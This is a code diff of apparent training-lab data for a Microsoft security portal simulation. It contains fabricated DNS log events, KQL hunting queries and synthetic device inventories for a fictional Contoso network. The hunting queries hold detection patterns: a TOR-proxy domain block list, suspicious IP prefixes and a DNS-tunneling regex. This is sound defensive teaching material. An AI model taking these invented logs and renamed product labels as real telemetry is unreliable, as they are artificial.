     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
     SrcIpAddr:'10.0.4.55', SrcHostname:'WKS-21', DstIpAddr:'10.0.0.10', DnsQuery:'updates.legit-looking.io',
     DnsQueryTypeName:'A', DnsResponseName:'45.95.168.241' },
-  { TimeGenerated:'2026-06-29T08:08:20Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:08:20Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
     SrcIpAddr:'10.0.4.31', SrcHostname:'WKS-12', DstIpAddr:'10.0.0.10', DnsQuery:'cdn.suspicious-host.ru',
     DnsQueryTypeName:'A', DnsResponseName:'185.220.102.8' },
@@ -3083,31 +3896,31 @@ const IM_DNS = [
     DnsQueryTypeName:'TXT', DnsResponseName:'"ack=003"' },
 
   // ANY-type recon — historically used for amplification reflection.
-  { TimeGenerated:'2026-06-29T08:13:01Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:13:01Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
     SrcIpAddr:'198.51.100.22', SrcHostname:'(external)', DstIpAddr:'10.0.0.10', DnsQuery:'contoso.com',
     DnsQueryTypeName:'ANY', DnsResponseName:'(multiple)' },
-  { TimeGenerated:'2026-06-29T08:13:09Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:13:09Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
     SrcIpAddr:'203.0.113.41', SrcHostname:'(external)', DstIpAddr:'10.0.0.10', DnsQuery:'contoso.com',
     DnsQueryTypeName:'ANY', DnsResponseName:'(multiple)' },
 
   // Plain NXDOMAIN typos — noise that any NXDOMAIN-only rule will surface.
-  { TimeGenerated:'2026-06-29T08:14:22Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:14:22Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
     SrcIpAddr:'10.0.4.12', SrcHostname:'WKS-01', DstIpAddr:'10.0.0.10', DnsQuery:'microsft.com',
     DnsQueryTypeName:'A', DnsResponseName:'' },
-  { TimeGenerated:'2026-06-29T08:14:48Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:14:48Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Failure', EventResultDetails:'NXDOMAIN',
     SrcIpAddr:'10.0.4.41', SrcHostname:'WKS-17', DstIpAddr:'10.0.0.10', DnsQuery:'githunb.com',
     DnsQueryTypeName:'A', DnsResponseName:'' },
 
   // Internal lookups — confirm parser handles TXT/MX too.
-  { TimeGenerated:'2026-06-29T08:16:10Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:16:10Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
     SrcIpAddr:'10.0.0.5', SrcHostname:'MAIL-01', DstIpAddr:'10.0.0.10', DnsQuery:'corp.contoso.local',
     DnsQueryTypeName:'MX', DnsResponseName:'mail-01.corp.contoso.local' },
-  { TimeGenerated:'2026-06-29T08:16:42Z', EventProduct:'Microsoft DNS Server', EventVendor:'Microsoft', EventSchema:'Dns',
+  { TimeGenerated:'2026-06-29T08:16:42Z', EventProduct:'Contoso DNS Server', EventVendor:'Contoso', EventSchema:'Dns',
     EventType:'Query', EventSubType:'response', EventResult:'Success', EventResultDetails:'NoError',
     SrcIpAddr:'10.0.0.5', SrcHostname:'MAIL-01', DstIpAddr:'10.0.0.10', DnsQuery:'_dmarc.contoso.com',
     DnsQueryTypeName:'TXT', DnsResponseName:'"v=DMARC1; p=reject; rua=mailto:dmarc@contoso.com"' },
@@ -3117,32 +3930,37 @@ const ASIM_DNS_SAVED_QUERIES = [
   {
     name:'Failed lookups (NXDOMAIN) — last day',
     description:'Canonical ASIM example. Surfaces typos, dead domains, and DGA bursts. Pivot on SrcHostname to find beaconing.',
+    expectedRows:9,
     query:`_Im_Dns(responsecodename='NXDOMAIN', starttime=ago(1d), endtime=now())\n| project TimeGenerated, SrcHostname, SrcIpAddr, DnsQuery, DnsQueryTypeName, EventResultDetails`,
   },
   {
     name:'Lookups to TOR proxy domains',
     description:"Block-list pattern. ASIM's domain_has_any takes a dynamic list — works against any normalized source.",
+    expectedRows:4,
     query:`let torProxies=dynamic(["tor2web.org","tor2web.com","torlink.co","tor2web.io"]);\n_Im_Dns(domain_has_any=torProxies)\n| project TimeGenerated, SrcHostname, DnsQuery, DnsResponseName, EventResultDetails`,
   },
   {
     name:'Responses pointing at known-bad prefixes',
     description:'response_has_any_prefix filters on the DnsResponseName. Prefixes end with a dot.',
+    expectedRows:6,
     query:`_Im_Dns(response_has_any_prefix=dynamic(["185.220.","45.95."]))\n| project TimeGenerated, SrcHostname, DnsQuery, DnsResponseName`,
   },
   {
     name:'ANY-type queries (amplification recon)',
     description:'DnsQueryTypeName == "ANY" from external sources is a recon / amplification signal.',
+    expectedRows:2,
     query:`_Im_Dns()\n| where DnsQueryTypeName == "ANY"\n| project TimeGenerated, SrcIpAddr, DnsQuery, DnsQueryTypeName`,
   },
   {
     name:'Long DNS labels (tunneling)',
     description:'Subdomain labels over 40 chars are a classic DNS exfiltration signal.',
+    expectedRows:3,
     query:`_Im_Dns()\n| where DnsQuery matches regex "^[A-Za-z0-9-]{30,}\\."\n| project TimeGenerated, SrcHostname, DnsQuery, DnsQueryTypeName`,
   },
 ];
 
 const ASIM_DNS_NOTES = [
-  { title:'Unifying parser', detail:'_Im_Dns calls every source-specific parser (vimDnsMicrosoftOMS, vimDnsCorelightZeek, …) and returns a single normalized result set. Always prefer it over a raw table name.' },
+  { title:'Unifying parser', detail:'_Im_Dns calls every source-specific parser (vimDnsContosoOMS, vimDnsCorelightZeek, …) and returns a single normalized result set. Always prefer it over a raw table name.' },
   { title:'Filter pushdown', detail:'Pass time and IP filters as parameters (starttime, srcipaddr, domain_has_any) — they push down to each source parser instead of running after the union, dramatically improving performance.' },
   { title:'Response duplication', detail:"DNS uses UDP, so request and response segments aren't linked. Most teams only log the client-facing response. Filter EventSubType == 'response' if you ingest multiple segments." },
   { title:'Schema version', detail:'Current ASIM DNS schema is 0.1.7. EventSchemaVersion stays pinned on the rows so downstream content can branch on it.' },
@@ -3150,33 +3968,1008 @@ const ASIM_DNS_NOTES = [
 
 // ---------- Defender for Endpoint device inventory + timeline ----------
 const DEVICES = [
-  { id:'WKS-03', name:'WKS-03', domain:'contoso.com', os:'Windows 11 Enterprise 23H2',
+  { avStatus:'Up to date', excluded:false, winVersion:'—', id:'WKS-03', name:'WKS-03', domain:'contoso.com', os:'Windows 11 Enterprise 23H2',
     riskLevel:'High', exposureLevel:'High', healthStatus:'Active', onboardingStatus:'Onboarded',
     sensor:'Defender for Endpoint', firstSeen:'2025-11-08T12:14:00Z', lastSeen:'2026-06-28T15:02:11Z',
     primaryUser:'jdoe@contoso.com', ip:'10.20.7.42', tags:['Sales','Win11'], openAlerts:2,
     isInternetFacing:true, recommendationCount:3, installedSoftware:42, discoveredVulnerabilities:2 },
-  { id:'FIN-FS-02', name:'FIN-FS-02', domain:'contoso.com', os:'Windows Server 2022',
+  { avStatus:'Up to date', excluded:false, winVersion:'—', id:'FIN-FS-02', name:'FIN-FS-02', domain:'contoso.com', os:'Windows Server 2022',
     riskLevel:'High', exposureLevel:'Medium', healthStatus:'Active', onboardingStatus:'Onboarded',
     sensor:'Defender for Endpoint', firstSeen:'2024-02-04T09:00:00Z', lastSeen:'2026-06-28T10:22:00Z',
     primaryUser:'fin-svc@contoso.com', ip:'10.20.3.14', tags:['Finance','FileServer'], openAlerts:2,
     isInternetFacing:false, recommendationCount:5, installedSoftware:64, discoveredVulnerabilities:4 },
-  { id:'WKS-01', name:'WKS-01', domain:'contoso.com', os:'Windows 11 Enterprise 23H2',
+  { avStatus:'Up to date', excluded:false, winVersion:'—', id:'WKS-01', name:'WKS-01', domain:'contoso.com', os:'Windows 11 Enterprise 23H2',
     riskLevel:'Medium', exposureLevel:'Medium', healthStatus:'Active', onboardingStatus:'Onboarded',
     sensor:'Defender for Endpoint', firstSeen:'2025-06-22T08:00:00Z', lastSeen:'2026-06-28T14:01:00Z',
     primaryUser:'svc-scan@contoso.com', ip:'10.20.7.10', tags:['IT','Win11'], openAlerts:1,
     isInternetFacing:false, recommendationCount:2, installedSoftware:39, discoveredVulnerabilities:1 },
-  { id:'WKS-02', name:'WKS-02', domain:'contoso.com', os:'Windows 11 Enterprise 23H2',
+  { avStatus:'Not updated', excluded:false, winVersion:'—', id:'WKS-02', name:'WKS-02', domain:'contoso.com', os:'Windows 11 Enterprise 23H2',
     riskLevel:'Medium', exposureLevel:'Low',    healthStatus:'Active', onboardingStatus:'Onboarded',
     sensor:'Defender for Endpoint', firstSeen:'2025-06-22T08:01:00Z', lastSeen:'2026-06-28T14:16:00Z',
     primaryUser:'svc-scan@contoso.com', ip:'10.20.7.11', tags:['IT','Win11'], openAlerts:1,
     isInternetFacing:false, recommendationCount:1, installedSoftware:37, discoveredVulnerabilities:1 },
-  { id:'DC01', name:'DC01', domain:'contoso.com', os:'Windows Server 2022 (Domain Controller)',
+  { avStatus:'Up to date', excluded:true, winVersion:'—', id:'DC01', name:'DC01', domain:'contoso.com', os:'Windows Server 2022 (Domain Controller)',
     riskLevel:'High', exposureLevel:'Low',    healthStatus:'Active', onboardingStatus:'Onboarded',
     sensor:'Defender for Identity + Defender for Endpoint',
     firstSeen:'2023-09-12T00:00:00Z', lastSeen:'2026-06-28T15:00:00Z',
     primaryUser:'(machine account)', ip:'10.20.0.10', tags:['Tier-0','DC'], openAlerts:2,
     isInternetFacing:false, recommendationCount:4, installedSoftware:31, discoveredVulnerabilities:3 },
+
+  // --- Windows 10 fleet: spans every health / antivirus / exclusion / version
+  // bucket the inventory filter offers, so each facet returns real rows. ---
+  { avStatus:'Up to date', excluded:false, winVersion:'22H2',
+    id:'W10-SALES-11', name:'W10-SALES-11', domain:'contoso.com', os:'Windows 10 Enterprise 22H2',
+    riskLevel:'Low', exposureLevel:'Low', healthStatus:'Active', onboardingStatus:'Onboarded',
+    sensor:'Defender for Endpoint', firstSeen:'2025-02-10T08:00:00Z', lastSeen:'2026-06-28T14:30:00Z',
+    primaryUser:'mrivera@contoso.com', ip:'10.20.7.51', tags:['Sales','Win10'], openAlerts:0,
+    isInternetFacing:false, recommendationCount:1, installedSoftware:35, discoveredVulnerabilities:0 },
+  { avStatus:'Not updated', excluded:false, winVersion:'21H2',
+    id:'W10-SALES-12', name:'W10-SALES-12', domain:'contoso.com', os:'Windows 10 Enterprise 21H2',
+    riskLevel:'Medium', exposureLevel:'Medium', healthStatus:'Misconfigured', onboardingStatus:'Onboarded',
+    sensor:'Defender for Endpoint', firstSeen:'2025-02-10T08:05:00Z', lastSeen:'2026-06-28T13:10:00Z',
+    primaryUser:'tchen@contoso.com', ip:'10.20.7.52', tags:['Sales','Win10'], openAlerts:0,
+    isInternetFacing:false, recommendationCount:4, installedSoftware:36, discoveredVulnerabilities:2 },
+  { avStatus:'Disabled', excluded:false, winVersion:'21H1',
+    id:'W10-ENG-04', name:'W10-ENG-04', domain:'contoso.com', os:'Windows 10 Pro 21H1',
+    riskLevel:'High', exposureLevel:'High', healthStatus:'Misconfigured', onboardingStatus:'Onboarded',
+    sensor:'Defender for Endpoint', firstSeen:'2024-09-01T08:00:00Z', lastSeen:'2026-06-28T11:45:00Z',
+    primaryUser:'dpatel@contoso.com', ip:'10.20.8.14', tags:['Engineering','Win10'], openAlerts:1,
+    isInternetFacing:false, recommendationCount:8, installedSoftware:58, discoveredVulnerabilities:6 },
+  { avStatus:'Unknown', excluded:false, winVersion:'20H2',
+    id:'W10-ENG-05', name:'W10-ENG-05', domain:'contoso.com', os:'Windows 10 Pro 20H2',
+    riskLevel:'Medium', exposureLevel:'Medium', healthStatus:'Inactive', onboardingStatus:'Onboarded',
+    sensor:'Defender for Endpoint', firstSeen:'2024-09-01T08:02:00Z', lastSeen:'2026-05-30T09:12:00Z',
+    primaryUser:'dpatel@contoso.com', ip:'10.20.8.15', tags:['Engineering','Win10'], openAlerts:0,
+    isInternetFacing:false, recommendationCount:5, installedSoftware:54, discoveredVulnerabilities:4 },
+  { avStatus:'Unknown', excluded:false, winVersion:'2004',
+    id:'W10-LAB-02', name:'W10-LAB-02', domain:'contoso.com', os:'Windows 10 Enterprise 2004',
+    riskLevel:'Medium', exposureLevel:'Low', healthStatus:'Inactive', onboardingStatus:'Onboarded',
+    sensor:'Defender for Endpoint', firstSeen:'2023-06-14T08:00:00Z', lastSeen:'2026-04-02T16:40:00Z',
+    primaryUser:'svc-lab@contoso.com', ip:'10.20.11.22', tags:['Lab','Win10'], openAlerts:0,
+    isInternetFacing:false, recommendationCount:6, installedSoftware:28, discoveredVulnerabilities:5 },
+  { avStatus:'Not updated', excluded:true, winVersion:'1909',
+    id:'W10-KIOSK-01', name:'W10-KIOSK-01', domain:'contoso.com', os:'Windows 10 Enterprise LTSC 1909',
+    riskLevel:'Medium', exposureLevel:'Medium', healthStatus:'Active', onboardingStatus:'Onboarded',
+    sensor:'Defender for Endpoint', firstSeen:'2023-03-20T08:00:00Z', lastSeen:'2026-06-28T07:55:00Z',
+    primaryUser:'(kiosk account)', ip:'10.20.13.9', tags:['Kiosk','Win10','Excluded'], openAlerts:0,
+    isInternetFacing:false, recommendationCount:3, installedSoftware:12, discoveredVulnerabilities:3 },
+  { avStatus:'Disabled', excluded:true, winVersion:'1903',
+    id:'W10-OT-BRIDGE', name:'W10-OT-BRIDGE', domain:'contoso.com', os:'Windows 10 IoT Enterprise 1903',
+    riskLevel:'High', exposureLevel:'High', healthStatus:'Misconfigured', onboardingStatus:'Onboarded',
+    sensor:'Defender for Endpoint', firstSeen:'2023-01-11T08:00:00Z', lastSeen:'2026-06-28T08:20:00Z',
+    primaryUser:'(machine account)', ip:'10.20.6.40', tags:['OT','Win10','Excluded'], openAlerts:1,
+    isInternetFacing:false, recommendationCount:9, installedSoftware:19, discoveredVulnerabilities:7 },
+  { avStatus:'Unknown', excluded:false, winVersion:'1809',
+    id:'W10-LEGACY-07', name:'W10-LEGACY-07', domain:'contoso.com', os:'Windows 10 Enterprise LTSC 1809',
+    riskLevel:'High', exposureLevel:'Medium', healthStatus:'Inactive', onboardingStatus:'Onboarded',
+    sensor:'Defender for Endpoint', firstSeen:'2022-08-05T08:00:00Z', lastSeen:'2026-03-18T10:00:00Z',
+    primaryUser:'mfoster@contoso.com', ip:'10.20.11.31', tags:['Legacy','Win10'], openAlerts:0,
+    isInternetFacing:false, recommendationCount:11, installedSoftware:24, discoveredVulnerabilities:9 },
+  { avStatus:'Disabled', excluded:false, winVersion:'1803',
+    id:'W10-LEGACY-08', name:'W10-LEGACY-08', domain:'contoso.com', os:'Windows 10 Pro 1803',
+    riskLevel:'High', exposureLevel:'High', healthStatus:'Misconfigured', onboardingStatus:'Onboarded',
+    sensor:'Defender for Endpoint', firstSeen:'2022-08-05T08:04:00Z', lastSeen:'2026-06-27T21:30:00Z',
+    primaryUser:'mfoster@contoso.com', ip:'10.20.11.32', tags:['Legacy','Win10'], openAlerts:1,
+    isInternetFacing:false, recommendationCount:13, installedSoftware:26, discoveredVulnerabilities:11 },
+  { avStatus:'Unknown', excluded:false, winVersion:'1709',
+    id:'W10-LEGACY-09', name:'W10-LEGACY-09', domain:'contoso.com', os:'Windows 10 Pro 1709',
+    riskLevel:'High', exposureLevel:'Medium', healthStatus:'Inactive', onboardingStatus:'Onboarded',
+    sensor:'Defender for Endpoint', firstSeen:'2022-02-19T08:00:00Z', lastSeen:'2026-01-09T13:05:00Z',
+    primaryUser:'(unassigned)', ip:'10.20.11.33', tags:['Legacy','Win10'], openAlerts:0,
+    isInternetFacing:false, recommendationCount:14, installedSoftware:22, discoveredVulnerabilities:12 },
+  { avStatus:'Unknown', excluded:false, winVersion:'1703',
+    id:'W10-LEGACY-10', name:'W10-LEGACY-10', domain:'contoso.com', os:'Windows 10 Pro 1703',
+    riskLevel:'High', exposureLevel:'Medium', healthStatus:'Inactive', onboardingStatus:'Onboarded',
+    sensor:'Defender for Endpoint', firstSeen:'2021-11-30T08:00:00Z', lastSeen:'2025-12-02T09:41:00Z',
+    primaryUser:'(unassigned)', ip:'10.20.11.34', tags:['Legacy','Win10'], openAlerts:0,
+    isInternetFacing:false, recommendationCount:15, installedSoftware:21, discoveredVulnerabilities:13 },
+  { avStatus:'Disabled', excluded:false, winVersion:'1607',
+    id:'W10-LEGACY-11', name:'W10-LEGACY-11', domain:'contoso.com', os:'Windows 10 Enterprise LTSB 1607',
+    riskLevel:'High', exposureLevel:'High', healthStatus:'Inactive', onboardingStatus:'Onboarded',
+    sensor:'Defender for Endpoint', firstSeen:'2021-05-04T08:00:00Z', lastSeen:'2025-10-14T11:22:00Z',
+    primaryUser:'(unassigned)', ip:'10.20.11.35', tags:['Legacy','Win10'], openAlerts:0,
+    isInternetFacing:false, recommendationCount:17, installedSoftware:18, discoveredVulnerabilities:15 },
+  { avStatus:'Up to date', excluded:false, winVersion:'Future',
+    id:'W10-INSIDER-01', name:'W10-INSIDER-01', domain:'contoso.com', os:'Windows 10 Enterprise Insider Preview',
+    riskLevel:'Low', exposureLevel:'Low', healthStatus:'Active', onboardingStatus:'Onboarded',
+    sensor:'Defender for Endpoint', firstSeen:'2026-05-20T08:00:00Z', lastSeen:'2026-06-28T14:50:00Z',
+    primaryUser:'itlab@contoso.com', ip:'10.20.11.40', tags:['IT','Insider'], openAlerts:0,
+    isInternetFacing:false, recommendationCount:1, installedSoftware:33, discoveredVulnerabilities:0 },
 ];
+
+// ---------- Device discovery (unmanaged assets seen by onboarded sensors) ----------
+// Onboarded devices act as sensors: passive traffic analysis (basic) plus active
+// probing (standard) surfaces endpoints, network gear, and IoT that no agent covers.
+// `tab` maps a device to a device-inventory tab; `onboardingStatus` drives the
+// "can this be protected?" triage the learner practices here.
+const DISCOVERED_DEVICES = [
+  // --- Computers & Mobile ---
+  { id:'DD-001', name:'LAB-VM-07', tab:'computers', type:'Workstation', os:'Windows 10 Pro 22H2',
+    ip:'10.20.7.88', mac:'00-15-5D-3A-11-04', vendor:'Contoso Corporation', network:'CORP-LAN',
+    onboardingStatus:'Can be onboarded', discoverySource:'Standard', riskLevel:'Medium',
+    firstSeen:'2026-05-02T09:12:00Z', lastSeen:'2026-06-28T14:40:00Z', highValue:false,
+    protocols:['ARP','SMB','WinRM','LLMNR'], seenBy:['WKS-01','WKS-02'], recommendationCount:4,
+    note:'Unmanaged bench VM. Same subnet as onboarded sales workstations.' },
+  { id:'DD-002', name:'CONTRACTOR-LT1', tab:'computers', type:'Workstation', os:'Windows 11 Home',
+    ip:'10.20.7.140', mac:'A4-83-E7-9C-22-1B', vendor:'Dell Inc.', network:'CORP-LAN',
+    onboardingStatus:'Can be onboarded', discoverySource:'Standard', riskLevel:'High',
+    firstSeen:'2026-06-24T08:31:00Z', lastSeen:'2026-06-28T15:01:00Z', highValue:false,
+    protocols:['ARP','DHCP','SMB','HTTP'], seenBy:['WKS-03'], recommendationCount:7,
+    note:'Personal device on corporate LAN. Shadow IT — no sensor, no policy.' },
+  { id:'DD-003', name:'BUILD-SRV-09', tab:'computers', type:'Server', os:'Ubuntu Server 22.04 LTS',
+    ip:'10.20.3.51', mac:'52-54-00-B7-4E-A9', vendor:'QEMU/KVM', network:'CORP-LAN',
+    onboardingStatus:'Can be onboarded', discoverySource:'Standard', riskLevel:'High',
+    firstSeen:'2026-01-14T10:00:00Z', lastSeen:'2026-06-28T13:55:00Z', highValue:true,
+    protocols:['SSH','HTTP','ICMP','ARP'], seenBy:['FIN-FS-02'], recommendationCount:9,
+    note:'Exposed SSH. High-value: holds build artifacts signed for production.' },
+  { id:'DD-004', name:'ESXI-HOST-02', tab:'computers', type:'Server', os:'VMware ESXi 7.0',
+    ip:'10.20.3.8', mac:'00-50-56-A1-33-7C', vendor:'VMware, Inc.', network:'CORP-LAN',
+    onboardingStatus:'Unsupported', discoverySource:'Standard', riskLevel:'Medium',
+    firstSeen:'2024-11-02T00:00:00Z', lastSeen:'2026-06-28T15:00:00Z', highValue:true,
+    protocols:['HTTPS','SSH','SLP'], seenBy:['FIN-FS-02','DC01'], recommendationCount:3,
+    note:'Hypervisor — no Defender for Endpoint sensor exists for this platform.' },
+  { id:'DD-005', name:'ANDROID-8F2C', tab:'computers', type:'Mobile', os:'Android 14',
+    ip:'10.20.9.31', mac:'C8-3D-D4-7E-90-52', vendor:'Samsung Electronics', network:'CORP-WIFI',
+    onboardingStatus:'Can be onboarded', discoverySource:'Basic', riskLevel:'Low',
+    firstSeen:'2026-06-11T07:45:00Z', lastSeen:'2026-06-28T12:10:00Z', highValue:false,
+    protocols:['DHCP','mDNS','ARP'], seenBy:['WKS-01'], recommendationCount:1,
+    note:'BYOD handset. Onboardable via Defender for Endpoint mobile app.' },
+  { id:'DD-006', name:'10.20.9.77', tab:'computers', type:'Unknown', os:'Unknown',
+    ip:'10.20.9.77', mac:'2E-91-A0-45-C3-08', vendor:'(locally administered)', network:'CORP-WIFI',
+    onboardingStatus:'Insufficient info', discoverySource:'Basic', riskLevel:'Informational',
+    firstSeen:'2026-06-27T19:02:00Z', lastSeen:'2026-06-27T19:44:00Z', highValue:false,
+    protocols:['ARP'], seenBy:['WKS-02'], recommendationCount:0,
+    note:'Randomized MAC, brief appearance. Too little traffic to classify.' },
+  { id:'DD-007', name:'MAC-DESIGN-04', tab:'computers', type:'Workstation', os:'macOS 14 Sonoma',
+    ip:'10.20.7.161', mac:'F0-18-98-2D-6B-77', vendor:'Apple, Inc.', network:'CORP-LAN',
+    onboardingStatus:'Can be onboarded', discoverySource:'Standard', riskLevel:'Low',
+    firstSeen:'2026-03-19T09:00:00Z', lastSeen:'2026-06-28T11:20:00Z', highValue:false,
+    protocols:['mDNS','AFP','SSH','ARP'], seenBy:['WKS-03'], recommendationCount:2,
+    note:'Design team Mac. Sensor available for macOS — onboard to close the gap.' },
+
+  // --- Network devices (authenticated SNMP scans) ---
+  { id:'DD-101', name:'CORE-SW-01', tab:'network', type:'Switch', os:'Cisco IOS 15.2',
+    ip:'10.20.0.2', mac:'00-1B-0D-63-C2-C0', vendor:'Cisco Systems', network:'CORP-LAN',
+    onboardingStatus:'Unsupported', discoverySource:'Authenticated scan', riskLevel:'Medium',
+    firstSeen:'2023-08-01T00:00:00Z', lastSeen:'2026-06-28T14:00:00Z', highValue:true,
+    protocols:['SNMP','CDP','LLDP'], seenBy:['DC01'], recommendationCount:5,
+    note:'Core switch. Assessed by SNMP read-only scan from DC01 (scanner role).' },
+  { id:'DD-102', name:'EDGE-FW-01', tab:'network', type:'Firewall', os:'FortiOS 7.2',
+    ip:'10.20.0.1', mac:'00-09-0F-11-88-30', vendor:'Fortinet', network:'CORP-LAN',
+    onboardingStatus:'Unsupported', discoverySource:'Authenticated scan', riskLevel:'High',
+    firstSeen:'2023-08-01T00:00:00Z', lastSeen:'2026-06-28T14:00:00Z', highValue:true,
+    protocols:['SNMP','HTTPS','SSH'], seenBy:['DC01'], recommendationCount:6,
+    note:'Perimeter firewall running firmware with known CVEs. Patch via network team.' },
+  { id:'DD-103', name:'WLC-01', tab:'network', type:'WLAN controller', os:'Cisco AireOS 8.10',
+    ip:'10.20.0.6', mac:'00-1B-0D-A4-19-70', vendor:'Cisco Systems', network:'CORP-LAN',
+    onboardingStatus:'Unsupported', discoverySource:'Authenticated scan', riskLevel:'Low',
+    firstSeen:'2024-02-11T00:00:00Z', lastSeen:'2026-06-28T13:30:00Z', highValue:false,
+    protocols:['SNMP','CDP'], seenBy:['DC01'], recommendationCount:2,
+    note:'Wireless controller for CORP-WIFI.' },
+  { id:'DD-104', name:'BRANCH-RTR-03', tab:'network', type:'Router', os:'MikroTik RouterOS 6.48',
+    ip:'10.20.12.1', mac:'DC-2C-6E-55-01-9A', vendor:'MikroTik', network:'BRANCH-LAN',
+    onboardingStatus:'Unsupported', discoverySource:'Standard', riskLevel:'High',
+    firstSeen:'2025-09-30T00:00:00Z', lastSeen:'2026-06-28T09:12:00Z', highValue:false,
+    protocols:['MNDP','SNMP','Telnet'], seenBy:['WKS-02'], recommendationCount:4,
+    note:'Telnet reachable and firmware is years behind. Not yet under authenticated scan.' },
+
+  // --- IoT / OT (requires Defender for IoT in the portal) ---
+  { id:'DD-201', name:'PRN-FIN-02', tab:'iot', type:'Printer', os:'HP FutureSmart 4',
+    ip:'10.20.5.20', mac:'3C-52-82-90-1E-44', vendor:'HP Inc.', network:'CORP-LAN',
+    onboardingStatus:'Unsupported', discoverySource:'Standard', riskLevel:'Medium',
+    firstSeen:'2024-05-06T00:00:00Z', lastSeen:'2026-06-28T14:44:00Z', highValue:false,
+    protocols:['IPP','PJL','SNMP','mDNS'], seenBy:['FIN-FS-02'], recommendationCount:3,
+    note:'Finance floor printer. Default admin page reachable over HTTP.' },
+  { id:'DD-202', name:'CAM-LOBBY-01', tab:'iot', type:'Camera', os:'Axis OS 10.12',
+    ip:'10.20.5.61', mac:'AC-CC-8E-71-3B-02', vendor:'Axis Communications', network:'CORP-LAN',
+    onboardingStatus:'Unsupported', discoverySource:'Standard', riskLevel:'High',
+    firstSeen:'2024-05-06T00:00:00Z', lastSeen:'2026-06-28T15:02:00Z', highValue:false,
+    protocols:['RTSP','HTTP','SSDP','ARP'], seenBy:['WKS-03'], recommendationCount:5,
+    note:'Camera with a vendor default credential recommendation open against it.' },
+  { id:'DD-203', name:'CONF-DISPLAY-3', tab:'iot', type:'Audio and Video', os:'Embedded Linux',
+    ip:'10.20.5.90', mac:'00-04-F2-6C-55-31', vendor:'Polycom', network:'CORP-LAN',
+    onboardingStatus:'Unsupported', discoverySource:'Basic', riskLevel:'Low',
+    firstSeen:'2025-01-22T00:00:00Z', lastSeen:'2026-06-28T10:05:00Z', highValue:false,
+    protocols:['SIP','SSDP','mDNS'], seenBy:['WKS-01'], recommendationCount:1,
+    note:'Conference room display/codec.' },
+  { id:'DD-204', name:'HVAC-CTRL-01', tab:'iot', type:'Smart Facility', os:'Tridium Niagara 4',
+    ip:'10.20.6.11', mac:'00-40-9D-3E-77-A1', vendor:'Honeywell', network:'BMS-VLAN',
+    onboardingStatus:'Unsupported', discoverySource:'Standard', riskLevel:'High',
+    firstSeen:'2024-08-14T00:00:00Z', lastSeen:'2026-06-28T08:30:00Z', highValue:true,
+    protocols:['BACnet','HTTP','Telnet'], seenBy:['FIN-FS-02'], recommendationCount:6,
+    note:'Building management controller. OT asset — treat scanning here with care.' },
+  { id:'DD-205', name:'BADGE-RDR-07', tab:'iot', type:'Smart Facility', os:'Embedded RTOS',
+    ip:'10.20.6.24', mac:'00-06-8E-12-44-90', vendor:'HID Global', network:'BMS-VLAN',
+    onboardingStatus:'Insufficient info', discoverySource:'Basic', riskLevel:'Informational',
+    firstSeen:'2026-04-02T00:00:00Z', lastSeen:'2026-06-26T22:15:00Z', highValue:false,
+    protocols:['ARP','UDP'], seenBy:['FIN-FS-02'], recommendationCount:0,
+    note:'Door reader. Passive traffic only — classification is a best guess.' },
+  { id:'DD-206', name:'SMART-TV-CAFE', tab:'iot', type:'Smart Appliance', os:'Tizen 7.0',
+    ip:'10.20.9.115', mac:'8C-79-F5-2A-64-D3', vendor:'Samsung Electronics', network:'CORP-WIFI',
+    onboardingStatus:'Unsupported', discoverySource:'Standard', riskLevel:'Low',
+    firstSeen:'2025-11-19T00:00:00Z', lastSeen:'2026-06-27T18:00:00Z', highValue:false,
+    protocols:['SSDP','mDNS','HTTP'], seenBy:['WKS-02'], recommendationCount:1,
+    note:'Break room TV on the corporate wireless network.' },
+];
+
+// ---------- Bulk fleet (the rest of the estate) ----------
+// The devices above are the hand-written teaching cases the labs reference by name.
+// A tenant this size also carries several hundred ordinary assets spread across
+// dozens of classifications, and the device-type distribution only reads like an
+// enterprise when they are present. Each classification is described once below;
+// the builder expands it into individual devices using a seeded PRNG, so every
+// reload produces the identical inventory, addressing, and counts.
+
+// MAC vendor prefixes. Discovery infers the vendor from the OUI, so the prefix and
+// the vendor name always agree in the inventory.
+const FLEET_OUI = {
+  'Cisco Systems':'00-1B-0D', 'Cisco Meraki':'00-18-0A', 'Aruba Networks':'6C-F3-7F',
+  'Ubiquiti Networks':'78-8A-20', 'Ruckus Networks':'C0-8A-DE', 'Juniper Networks':'3C-8A-B0',
+  'MikroTik':'DC-2C-6E', 'Fortinet':'00-09-0F', 'Palo Alto Networks':'00-1B-17',
+  'F5 Networks':'00-01-D7', 'Netgear':'20-4E-7F', 'Zyxel':'5C-6A-80', 'Barracuda Networks':'00-D0-83',
+  'Infoblox':'00-1B-2B', 'Gigamon':'00-1D-AC', 'Keysight Technologies':'00-1B-1B',
